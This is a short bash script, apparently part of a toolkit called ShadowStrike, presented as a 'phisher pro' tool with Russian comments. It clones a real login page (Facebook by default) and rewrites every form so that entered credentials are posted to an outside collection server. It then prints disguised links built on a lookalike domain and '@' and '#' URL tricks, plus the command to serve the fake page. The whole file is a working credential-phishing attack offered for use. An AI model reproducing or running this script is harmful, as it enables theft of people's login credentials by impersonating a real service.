#!/bin/bash
# PHISHER PRO — продвинутый фишинг + маскировка URL

TARGET_URL=${1:-"https://facebook.com/login"}
MASK_DOMAIN=${2:-"facebook-security.com"}

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — PHISHER PRO                ║"
echo "╚══════════════════════════════════════════════╝"

# 1. Клонируем страницу
echo "[PHISH] Клонирую $TARGET_URL..."
curl -sk --max-time 10 "$TARGET_URL" > /tmp/phish_page.html 2>/dev/null

# 2. Подменяем форму
echo "[PHISH] Подменяю форму..."
cat /tmp/phish_page.html | \
    sed 's|<form|<form action="https://YOUR_SERVER/grab" method="POST"|g' | \
    sed 's|action="[^"]*"|action="https://YOUR_SERVER/grab"|g' \
    > /tmp/phish_ready.html

# 3. Генерируем маскированные URL (MaskPhish style)
echo "[PHISH] Генерирую URL..."
IP=$(ip route 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1)
[ -z "$IP" ] && IP="127.0.0.1"

echo ""
echo "══════════════════════════════════════════════"
echo "  МАСКИРОВАННЫЕ URL:"
echo "══════════════════════════════════════════════"
echo "  Оригинал: http://$IP:8880"
echo ""
echo "  Маскировка 1: https://$MASK_DOMAIN/login"
echo "  Маскировка 2: https://$MASK_DOMAIN/security-check"
echo "  Маскировка 3: https://$MASK_DOMAIN/account-verification"
echo ""
echo "  Для маскировки через @ использовать:"
echo "  https://$MASK_DOMAIN@$IP:8880"
echo ""
echo "  Для маскировки через # использовать:"
echo "  https://$MASK_DOMAIN/login#session=$IP:8880"
echo "══════════════════════════════════════════════"
echo ""
echo "  Файл: /tmp/phish_ready.html"
echo "  Запуск сервера: python3 -m http.server 8880"
